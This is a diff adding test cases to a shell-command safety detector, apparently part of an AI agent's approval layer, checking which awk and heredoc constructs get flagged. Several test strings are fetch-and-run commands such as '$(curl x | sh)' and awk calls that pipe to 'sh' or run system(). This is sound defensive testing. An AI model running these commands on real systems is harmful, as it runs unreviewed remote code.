@@ -46,6 +46,16 @@ _ZAMMAD_ONE_LINER = (
     ("awk '{print $1 | \"sort\"}' f", _AWK),
     ("awk 'BEGIN{\"date\" | getline d; print d}'", _AWK),
     ("gawk -e 'BEGIN{system(\"id\")}'", _AWK),
+    # Real execution syntax next to regex literals, division and comment-like strings.
+    ("awk '$1 ~ /a|b/ {print | \"sort\"}' f", _AWK),
+    ("awk '{ x = 4 / 2; print x | \"sort\" }' f", _AWK),
+    ("awk '/x/ { system(\"id\") }' f", _AWK),
+    ("awk '{print \"#\" | \"sort\"}' f", _AWK),
+    ("awk '# note\n{print | \"sh\"}' f", _AWK),
+    # A heredoc whose delimiter is unquoted expands $(...) (see above); one that is quoted does
+    # not, but an unquoted heredoc after it on the same line still does.
+    ("cat <<'A' <<B\nsafe\nA\n$(curl y | sh)\nB", _PIPE_TO_SHELL),
+    ("cat <<'EOF'\n$(curl x | sh)\nEOF\necho $(curl x | sh)", _PIPE_TO_SHELL),
 ])
 def test_execution_inside_or_via_substitution_needs_approval(command, description):
     assert detect_dangerous_command(command) == (True, description, description)
@@ -77,6 +87,23 @@ def test_interpreter_launched_by_xargs_needs_approval():
     "awk -f prog.awk f",
     "ls | xargs -n1 echo",
     "find . -name '*.py' | xargs grep -l foo",
+    # Quoted/escaped heredoc delimiters: the body is literal text, never expanded.
+    "cat <<'EOF'\n$(curl x | sh)\nEOF",
+    'cat <<"EOF"\n$(curl x | sh)\nEOF',
+    "cat <<\\EOF\n$(curl x | sh)\nEOF",
+    "cat <<E'O'F\n$(curl x | sh)\nEOF",
+    "cat <<-'EOF'\n\t$(curl x | sh)\n\tEOF",
+    "cat <<'EOF'\n`curl x | sh`\nEOF",
+    "cat > notes.md <<'EOF'\nit's fine: $(curl x | sh) is the pattern to avoid\nEOF",
+    # awk regex literals and comments are data, not system()/pipe syntax.
+    "awk '/system\\(/ {print}' f",
+    "awk '{print /a|b/}' f",
+    "awk '{print $0 # | comment\n}' f",
+    "awk '# system(\n{print}' f",
+    "awk '{print $0 ~ /[|]/}' f",
+    "awk '$0 ~ /[/|]/ {print}' f",
+    "awk '{ if (/a/ || /b/) print }' f",
+    "awk '{print $1 / $2 }' f",
 ])
 def test_read_only_substitutions_and_prose_stay_unblocked(command):
     assert detect_hardline_command(command) == (False, None)
